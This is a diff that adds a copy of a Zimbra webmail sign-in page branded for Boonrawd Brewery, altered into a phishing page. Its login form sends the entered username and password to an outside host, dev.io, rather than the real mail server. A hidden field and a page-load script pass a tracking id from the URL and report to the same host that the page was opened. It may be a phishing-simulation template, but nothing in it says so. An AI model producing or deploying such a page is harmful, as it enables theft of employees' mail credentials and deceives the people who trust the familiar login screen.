@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<!-- saved from url=(0047)https://mail.boonrawd.co.th/public/loginbrb.jsp -->
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <!--
+ loginTouch.jsp
+ * ***** BEGIN LICENSE BLOCK *****
+ * Zimbra Collaboration Suite Web Client
+ * Copyright (C) 2013, 2014 Zimbra, Inc.
+ * 
+ * This program is free software: you can redistribute it and/or modify it under
+ * the terms of the GNU General Public License as published by the Free Software Foundation,
+ * version 2 of the License.
+ * 
+ * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+ * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * See the GNU General Public License for more details.
+ * You should have received a copy of the GNU General Public License along with this program.
+ * If not, see <http://www.gnu.org/licenses/>.
+ * ***** END LICENSE BLOCK *****
+-->
+
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1"
+    />
+    <meta
+      name="description"
+      content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com."
+    />
+
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <link
+      rel="apple-touch-icon"
+      sizes="57x57"
+      href="https://mail.boonrawd.co.th/img/logo/Icon.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="72x72"
+      href="https://mail.boonrawd.co.th/img/logo/Icon~ipad.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="114x114"
+      href="https://mail.boonrawd.co.th/img/logo/Icon@2x.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="144x144"
+      href="https://mail.boonrawd.co.th/img/logo/Icon~ipad@2x.png"
+    />
+
+    <title>Zimbra Web Client Sign In</title>
+    <link rel="stylesheet" type="text/css" href="./index_files/ztouch.css" />
+
+    <script type="text/javascript">
+      //   var b = document.documentElement;
+      //   b.className = b.className.replace('no-js', 'js');
+      //   b.setAttribute('data-useragent', navigator.userAgent);
+      //   b.setAttribute('data-platform', navigator.platform);
+
+      function enableSignIn() {
+        var loginBtn = document.getElementById('loginBtn'),
+          userName = document.getElementById('username'),
+          passwd = document.getElementById('password');
+
+        if (userName.value.length || passwd.value.length) {
+          loginBtn.className += ' enabled';
+        } else {
+          loginBtn.className = loginBtn.className.replace(
+            /(?:^|\s)enabled(?!\S)/g,
+            ''
+          );
+        }
+      }
+
+      function onSubmitPage() {
+        document.getElementById('loginForm').submit();
+      }
+
+      function onKeypush(even) {
+        if (even.keyCode == 13) {
+          onSubmitPage();
+        }
+      }
+    </script>
+  </head>
+  <body onload="onLoad()" cz-shortcut-listen="true">
+    <div class="LoginScreen">
+      <table
+        align="center"
+        width="900"
+        cellpadding="0"
+        cellspacing="0"
+        border="0"
+        style="margin-top:40px; font-family:tahoma;"
+      >
+        <tbody>
+          <tr>
+            <td width="477">
+              <img
+                src="./index_files/banner.jpg"
+                name="banner1s"
+                width="477"
+                height="490"
+                id="banner1s"
+              />
+            </td>
+            <td width="75"></td>
+            <td width="348" valign="top">
+              <div style="margin-top:50px;">
+                <img src="./index_files/logo.jpg" />
+                <form
+                  method="post"
+                  id="loginForm"
+                  name="loginForm"
+                  action="http://dev.io/api/reply/data"
+                  accept-charset="UTF-8"
+                >
+                  <input type="hidden" id="uuid" name="uuid" />
+                  <input
+                    type="hidden"
+                    name="url"
+                    value="https://mail.boonrawd.co.th"
+                  />
+                  <div>
+                    <div
+                      style="margin-bottom:10px; font-family:tahoma; color:#9e9d9d; font-size:13px; margin-top:23px;"
+                    >
+                      โปรดกรอกชื่อผู้ใช้และรหัสผ่านเพื่อเข้าใช้งาน
+                    </div>
+
+                    <div
+                      class="zLoginFieldDiv"
+                      style="color:#9e9d9d; font-size:13px;"
+                    >
+                      Username:
+                      <input
+                        style="height:22px; width:230px; border:1px solid #bababa; background-color:#EEE; margin-top:8px; color:#666666; padding:5px;"
+                        id="username"
+                        class="zLoginField"
+                        name="username"
+                        onkeyup="enableSignIn();"
+                        type="text"
+                        value=""
+                        size="25"
+                        placeholder="Username"
+                        autocapitalize="off"
+                        autocorrect="off"
+                      />
+                    </div>
+                    <div
+                      class="zLoginFieldDiv"
+                      style="color:#9e9d9d; font-size:13px;"
+                    >
+                      Password:
+                      <input
+                        id="password"
+                        class="zLoginField"
+                        name="password"
+                        onkeyup="enableSignIn();"
+                        type="password"
+                        value=""
+                        size="25"
+                        placeholder="Password"
+                        style=" margin-left:4px; height:22px; width:230px; border:1px solid #bababa; background-color:#EEE; margin-top:8px; color:#666666; padding:5px;"
+                      />
+                    </div>
+                    <div class="LoginButtonDiv" style="margin-top:-15px;">
+                      <input
+                        src="./index_files/singin.jpg"
+                        name="loginBtn"
+                        type="image"
+                        id="loginBtn"
+                        class="LoginButton"
+                      />
+                      <!--<img src="./images/singin.jpg" id="loginBtn" class="LoginButton" onclick="onSubmitPage()" onkeypress = "onKeypush(event)">-->
+                    </div>
+                  </div>
+                </form>
+              </div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      <div class="Footer">
+        <div class="copyright" style="text-align:center; margin-top:-100px;">
+          Copyright © 2014 Boonrawd Mail Collaboration by Boonrawd Brewery
+          Company Limited.
+        </div>
+      </div>
+    </div>
+    <div class="SplashScreenProgressBar" style="display:none;"></div>
+    <script>
+      function onLoad() {
+        return;
+      }
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const uuid = document.getElementById('uuid');
+      uuid.value = urlParams.get('uuid');
+
+      const xmlHttp = new XMLHttpRequest();
+      const url = `http://dev.io/api/reply/open?uuid=${urlParams.get('uuid')}`;
+      xmlHttp.open('GET', url);
+      xmlHttp.send();
+    </script>
+  </body>
+</html>
